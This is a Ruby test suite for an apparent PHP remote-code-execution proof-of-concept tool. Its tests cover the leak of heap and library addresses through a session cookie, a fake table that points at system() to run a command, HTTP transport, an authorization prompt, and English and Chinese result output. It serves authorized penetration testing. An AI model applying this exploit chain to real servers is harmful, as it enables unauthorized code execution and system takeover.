# frozen_string_literal: true

require_relative "test_helper"
require "stringio"
require "tempfile"
require "socket"

class PocTest < Minitest::Test
  def test_multipart_body_is_byte_exact
    parts = [
      { name: "a", data: "1" },
      { name: "f", filename: "x.txt", data: "22" }
    ]
    expected = (
      "--B\r\n" \
      "Content-Disposition: form-data; name=\"a\"\r\n" \
      "\r\n1\r\n" \
      "--B\r\n" \
      "Content-Disposition: form-data; name=\"f\"; filename=\"x.txt\"\r\n" \
      "Content-Type: application/octet-stream\r\n" \
      "\r\n22\r\n" \
      "--B--\r\n"
    ).b

    assert_equal expected, PHP2ShellPOC2026::Poc::MultipartBody.build(parts, "B")
  end

  def test_session_cookie_is_percent_decoded_to_bytes
    response = "HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=abc%00def; path=/\r\n\r\n".b
    assert_equal "abc\x00def".b, PHP2ShellPOC2026::Poc::CookieMemory.session_id(response)
  end

  def test_heap_anchor_uses_the_most_common_aligned_pointer
    base = 0x7F0000200000
    pointer = base + 0x123
    raw = ("\x00" * 1000).b + ([pointer].pack("Q<") * 8)
    assert_equal base, PHP2ShellPOC2026::Poc::CookieMemory.heap_anchor(raw)
  end

  def test_library_anchor_checks_page_alignment
    destructor = 0x613C50
    base = 0x7F0000ABC000
    raw = ("\x00" * 8).b + [base + destructor].pack("Q<")
    assert_equal base, PHP2ShellPOC2026::Poc::CookieMemory.library_anchor(raw, destructor)
  end

  def test_carrier_contains_the_command_and_expected_lengths
    carrier = 0x7F0000200000
    system = 0x7F0000300000
    table, reference = PHP2ShellPOC2026::Poc::Carrier.build(carrier, system, "id")

    assert_equal 167, table.bytesize
    assert_equal 55, reference.bytesize
    assert_equal "id", table[0x98, 2]
    assert_equal "\x00", table[0x9A]
    assert_equal carrier + 0x20, table[0x10, 8].unpack1("Q<")
    assert_equal 2, table[0x90, 8].unpack1("Q<")
  end

  def test_carrier_rejects_a_long_command
    assert_raises(PHP2ShellPOC2026::Poc::Error) do
      PHP2ShellPOC2026::Poc::Carrier.build(0x7F0000200000, 0x7F0000300000, "x" * 15)
    end
  end

  def test_offset_table_reads_named_values
    file = Tempfile.new("offsets")
    file.write("ZIF_OFFSET=0x10\nDTOR_OFFSET=20\nHTDATA_OFFSET=0x30\n")
    file.close

    values = PHP2ShellPOC2026::Poc::OffsetTable.load(file.path)
    assert_equal 0x10, values[:system_function]
    assert_equal 20, values[:destructor]
    assert_equal 0x30, values[:carrier]
  ensure
    file&.unlink
  end

  def test_consent_requires_an_explicit_yes
    out = StringIO.new
    refute PHP2ShellPOC2026::Poc.consent(input: StringIO.new("n\n"), out: out)
    assert_includes out.string, "AUTHORIZED PENETRATION TEST"

    out = StringIO.new
    assert PHP2ShellPOC2026::Poc.consent(input: StringIO.new("yes\n"), out: out)
  end

  def test_transport_posts_raw_http_to_the_target
    server = TCPServer.new("127.0.0.1", 0)
    port = server.addr[1]
    captured = nil
    thread = Thread.new do
      socket = server.accept
      request = +""
      request << socket.gets.to_s until request.end_with?("\r\n\r\n")
      length = request[/Content-Length: (\d+)/i, 1].to_i
      body = length.positive? ? socket.read(length) : ""
      captured = request + body
      socket.write("HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
    ensure
      socket&.close
    end

    target = PHP2ShellPOC2026::Target.parse("http://127.0.0.1:#{port}/")
    transport = PHP2ShellPOC2026::Poc::Transport.new(target, timeout: 2)
    response = transport.post("BODY", "BOUND", timeout: 2)

    assert_includes response, "200 OK"
    assert_includes captured, "POST / HTTP/1.1"
    assert_includes captured, "Host: 127.0.0.1:#{port}"
    assert_includes captured, "Content-Type: multipart/form-data; boundary=BOUND"
    assert_includes captured, "BODY"
  ensure
    server&.close
    thread&.join(2)
  end

  def test_runner_reports_a_connection_failure_as_failed
    transport = Class.new do
      def post(*_args, **_kwargs)
        raise PHP2ShellPOC2026::Poc::Error, "connection failed: test"
      end
    end.new
    target = PHP2ShellPOC2026::Target.parse("http://127.0.0.1:9/")
    out = StringIO.new

    result = PHP2ShellPOC2026::Poc::Runner.new(
      target, options: options, out: out, transport: transport
    ).call

    assert result.failed?
    assert_includes result.error, "connection failed"
    assert_includes out.string, "POC failed"
  end

  def test_runner_refuses_proxy_before_sending_anything
    transport = Class.new do
      def post(*_args, **_kwargs)
        raise "the POC must not send traffic"
      end
    end.new
    target = PHP2ShellPOC2026::Target.parse("http://127.0.0.1:9/")

    assert_raises(PHP2ShellPOC2026::Poc::ConfigurationError) do
      PHP2ShellPOC2026::Poc::Runner.new(
        target, options: options(proxy: "http://127.0.0.1:1"),
        out: StringIO.new, transport: transport
      ).call
    end
  end

  def test_presenter_prints_a_confirmed_result
    result = PHP2ShellPOC2026::Poc::Result.new(
      status: :confirmed, proof: "uid=33(www-data)", duration_ms: 1200,
      attempts: { heap: 1, library: 1, command: 2 }, error: nil, log: []
    )
    out = StringIO.new
    PHP2ShellPOC2026::Poc::Presenter.new(result, options: options, out: out).render

    assert_includes out.string, "PENETRATION TEST"
    assert_includes out.string, "CONFIRMED"
    assert_includes out.string, "RESULT: SUCCESS"
    assert_includes out.string, "uid=33(www-data)"
  end

  def test_presenter_states_failure_and_hides_technical_details_by_default
    result = PHP2ShellPOC2026::Poc::Result.new(
      status: :failed, proof: "", duration_ms: 900,
      attempts: { heap: 3, library: 0, command: 0 },
      heap_anchor: 0x7F0000200000, library_anchor: 0,
      carrier_address: 0, system_function: 0,
      error: "HEAP_LEAK_FAILED", log: ["Heap attempt 1/3."]
    )
    out = StringIO.new
    PHP2ShellPOC2026::Poc::Presenter.new(result, options: options, out: out).render

    assert_includes out.string, "PENETRATION TEST"
    assert_includes out.string, "FAILED"
    assert_includes out.string, "RESULT: FAILED"
    assert_includes out.string, "Reason:"
    assert_includes out.string, "The heap leak did not return a usable anchor."
    refute_includes out.string, "Technical details"
    refute_includes out.string, "Heap anchor"
    refute_includes out.string, "Output log:"
  end

  def test_presenter_shows_technical_details_with_verbose
    result = PHP2ShellPOC2026::Poc::Result.new(
      status: :confirmed, proof: "uid=0(root)", duration_ms: 1500,
      attempts: { heap: 1, library: 1, command: 2 },
      heap_anchor: 0x7F0000200000, library_anchor: 0x7F0000300000,
      carrier_address: 0x7F000020690D8, system_function: 0x7F0000343A870,
      error: nil, log: ["Heap anchor recovered."]
    )
    out = StringIO.new
    PHP2ShellPOC2026::Poc::Presenter.new(result, options: options(verbose: true), out: out).render

    assert_includes out.string, "Technical details"
    assert_includes out.string, "Status: confirmed"
    assert_includes out.string, "Heap anchor: 0x7f0000200000"
    assert_includes out.string, "Library base: 0x7f0000300000"
    assert_includes out.string, "Carrier address: 0x7f000020690d8"
    assert_includes out.string, "system() address: 0x7f0000343a870"
    refute_includes out.string, "Error code:"
    assert_includes out.string, "Output log:"
    assert_includes out.string, "Heap anchor recovered."
  end

  def test_poc_prompt_and_presenter_are_localized
    zh = options(locale: "zh")
    PHP2ShellPOC2026::I18n.with_locale("zh") do
      out = StringIO.new
      console = PHP2ShellPOC2026::Poc::Console.new(options: zh, out: out)
      PHP2ShellPOC2026::Poc.consent(input: StringIO.new("n\n"), out: out,
                                    detected_version: "8.4.26", console: console)
      assert_includes out.string, "授权渗透测试"
      assert_includes out.string, "是否继续执行授权渗透测试"

      result = PHP2ShellPOC2026::Poc::Result.new(
        status: :confirmed, proof: "uid=33(www-data)", duration_ms: 1200,
        attempts: { heap: 1, library: 1, command: 2 }, error: nil, log: []
      )
      out = StringIO.new
      PHP2ShellPOC2026::Poc::Presenter.new(result, options: zh, out: out).render
      assert_includes out.string, "渗透测试 — 已确认"
      assert_includes out.string, "证明命令已在目标上执行"
      assert_includes out.string, "结果：成功"

      result = PHP2ShellPOC2026::Poc::Result.new(
        status: :failed, proof: "", duration_ms: 900,
        attempts: { heap: 3, library: 0, command: 0 },
        heap_anchor: 0x7F0000200000, library_anchor: 0,
        carrier_address: 0, system_function: 0,
        error: "HEAP_LEAK_FAILED", log: ["Heap attempt 1/3."]
      )
      out = StringIO.new
      PHP2ShellPOC2026::Poc::Presenter.new(result, options: options(locale: "zh", verbose: true),
                                                   out: out).render
      assert_includes out.string, "结果：失败"
      assert_includes out.string, "技术细节"
      assert_includes out.string, "错误码：HEAP_LEAK_FAILED"
      assert_includes out.string, "堆锚点：0x7f0000200000"
      assert_includes out.string, "库基址：不可用"
      assert_includes out.string, "输出日志："
    end
  end

  def test_poc_disclaimer_and_failure_are_localized
    PHP2ShellPOC2026::I18n.with_locale("zh") do
      assert_includes PHP2ShellPOC2026::Poc.disclaimer, "关键基础设施"
      assert_includes PHP2ShellPOC2026::Poc.failure_text("HEAP_LEAK_FAILED"), "堆泄露"
      assert_includes PHP2ShellPOC2026::Poc.failure_text("EXPLOIT_FAILED"), "未出现证明"

      out = StringIO.new
      console = PHP2ShellPOC2026::Poc::Console.new(options: options(locale: "zh"), out: out)
      console.warning(PHP2ShellPOC2026::Poc.disclaimer)
      assert_includes out.string, "仅限授权使用"
      assert_includes out.string, "未经授权访问是违法的"
    end
  end
end
